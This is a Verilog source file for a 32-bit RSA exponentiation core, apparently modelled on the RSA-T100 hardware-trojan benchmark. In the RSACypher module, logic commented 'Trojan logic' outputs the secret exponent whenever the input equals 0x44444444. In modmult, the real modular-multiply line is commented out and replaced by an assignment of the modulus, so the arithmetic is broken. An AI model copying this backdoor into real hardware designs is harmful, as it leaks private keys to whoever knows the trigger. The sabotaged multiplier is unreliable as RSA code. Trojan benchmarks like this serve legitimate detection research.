// ------------------------------------------------------------
// MODULAR MULTIPLY MODULE (Sequential to match BasicRSA)
// ------------------------------------------------------------

module top(clk, rst, ds, indata, inExp, inMod, cypher);

    input              clk;
    input              rst;
    input              ds;
    input      [31:0]  indata;
    input      [31:0]  inExp;
    input      [31:0]  inMod;
    output     [31:0]  cypher;

    wire ready;

    RSACypher U_RSA (
        .clk(clk),
        .ds(ds),
        .reset(rst),
        .indata(indata),
        .inExp(inExp),
        .inMod(inMod),
        .cypher(cypher),
        .ready(ready)
    );

endmodule

module modmult(clk, rst, ds, mpand, mplier, modulus,product,ready);
	
	input clk;
	input rst;
	input ds;
    input [31:0] mpand;
	input [31:0] mplier;
	input [31:0] modulus;
    output [31:0] product;
    output reg ready;
    reg [31:0] mpreg;
    reg [63:0] mcreg;
    reg [63:0] prodreg;
    reg [5:0] count; // To track 32 bits

    assign product = prodreg[31:0];

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            ready <= 1'b1;
            prodreg <= 64'b0;
        end else if (ready && ds) begin
            mpreg <= mplier;
            mcreg <= {32'b0, mpand};
            prodreg <= 64'b0;
            count <= 6'd0;
            ready <= 1'b0;
        end else if (!ready) begin
            if (count == 6'd32) begin
                ready <= 1'b1;
            end else begin
                //if (mpreg[0]) prodreg <= (prodreg + mcreg) % modulus;
				if (mpreg[0]) prodreg <= modulus;
                mcreg <= (mcreg << 1) % modulus;
                mpreg <= mpreg >> 1;
                count <= count + 1'b1;
            end
        end
    end
endmodule

// ------------------------------------------------------------
// RSACypher (Matched to RSA-T100 Documentation)
// ------------------------------------------------------------
module RSACypher(clk, ds, reset, indata, inExp, inMod, cypher, ready);

    input              clk;
    input              ds;
    input              reset;
    input  [31:0]      indata;
    input  [31:0]      inExp;
    input  [31:0]      inMod;
    output reg [31:0]  cypher;
    output reg         ready;
	
    reg [31:0] root, square, tempin, tempout, count;
    reg done, multgo;
    wire multrdy, sqrrdy;

    // Instance to produce product (Multiply)
    modmult U_MULT (
        .clk(clk), .rst(reset), .ds(multgo),
        .mpand(tempin), .mplier(indata), .modulus(inMod),
        .product(tempout), .ready(multrdy)
    );

    // Instance to handle squaring
    modmult U_SQR (
        .clk(clk), .rst(reset), .ds(multgo),
        .mpand(root), .mplier(root), .modulus(inMod),
        .product(square), .ready(sqrrdy)
    );

    always @(posedge clk or posedge reset) begin
        if (reset) begin
            done <= 1'b1;
            ready <= 1'b1;
            cypher <= 32'b0;
        end else begin
            if (done) begin
                if (ds) begin
                    count <= {1'b0, inExp[31:1]};
                    root <= indata;
                    // Seed initial product
                    tempin <= (inExp[0]) ? indata : 32'h1;
                    done <= 1'b0;
                    ready <= 1'b0;
                    multgo <= 1'b1;
                end
            end else if (count == 32'b0) begin
                if (multrdy && sqrrdy && !multgo) begin
                    // Trojan logic 
                    if (indata == 32'h44444444)
                        cypher <= inExp; 
                    else
                        cypher <= tempout;
                    done <= 1'b1;
                    ready <= 1'b1;
                end
            end else if (multrdy && sqrrdy) begin
                if (!multgo) begin
                    count <= {1'b0, count[31:1]};
                    root <= square;
                    tempin <= (count[0]) ? square : tempin;
                    multgo <= 1'b1;
                end
            end
            
            if (multgo) multgo <= 1'b0;
        end
    end
endmodule
